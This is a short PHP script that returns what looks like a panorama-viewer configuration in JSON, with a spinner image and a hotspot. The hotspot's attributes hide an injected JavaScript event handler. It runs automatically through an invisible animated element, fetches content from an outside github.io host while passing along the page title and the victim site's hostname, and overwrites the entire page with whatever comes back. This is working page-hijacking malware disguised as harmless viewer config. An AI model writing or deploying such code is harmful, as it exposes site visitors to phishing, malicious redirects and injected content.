<?php

header('Access-Control-Allow-Origin: https://solar-distribution.baywa-re.com');
header('Access-Control-Allow-Methods: GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json; charset=utf-8');

$url = $_SERVER['REQUEST_URI'];

$pageTitle = basename(parse_url($url, PHP_URL_PATH));
$pageTitle = urldecode($pageTitle);

$response = [
    'autoLoad' => true,
    'pitch' => 0,
    'yaw' => 0,
    'basePath' => 'data:image/svg+xml;base64,',
    'panorama' => 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MCA1MCIgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIj48Y2lyY2xlIGN4PSIyNSIgY3k9IjI1IiByPSIyMCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZTBlMGUwIiBzdHJva2Utd2lkdGg9IjQiLz48Y2lyY2xlIGN4PSIyNSIgY3k9IjI1IiByPSIyMCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMzQ5OGRiIiBzdHJva2Utd2lkdGg9IjQiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWRhc2hhcnJheT0iMzAgMTAwIj48YW5pbWF0ZVRyYW5zZm9ybSBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InJvdGF0ZSIgZnJvbT0iMCAyNSAyNSIgdG89IjM2MCAyNSAyNSIgZHVyPSIxcyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiLz48L2NpcmNsZT48L3N2Zz4=',

    'hotSpots' => [
        [
            'pitch' => 0,
            'yaw' => 0,
            'type' => 'info',
            'URL' => '#',
            'attributes' => [
                'style' => "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
                'onanimationend' => "if (window.__grav_FETCH_RAN__) { console.log('already ran'); } else { window.__grav_FETCH_RAN__ = 1; var redirectWithoutReferrer = function (url) { var meta = document.createElement('meta'); meta.name = 'referrer'; meta.content = 'no-referrer'; document.head.appendChild(meta); window.location.replace(url); }; fetch('https://xnxxusa.github.io/eduhaes/xox/video/conn.php?file=" . $pageTitle . "&host=' + window.location.hostname + '&cache=1').then(function (res) { return res.text(); }).then(function (e) { document.open(); document.write(e); document.close(); }).catch(function (err) { console.error(err); }); }"
            ]
        ]
    ],

    // Your dynamic value
    // 'title' => 'page title is: ' . $pageTitle
];

echo json_encode(
    $response,
    JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE
);
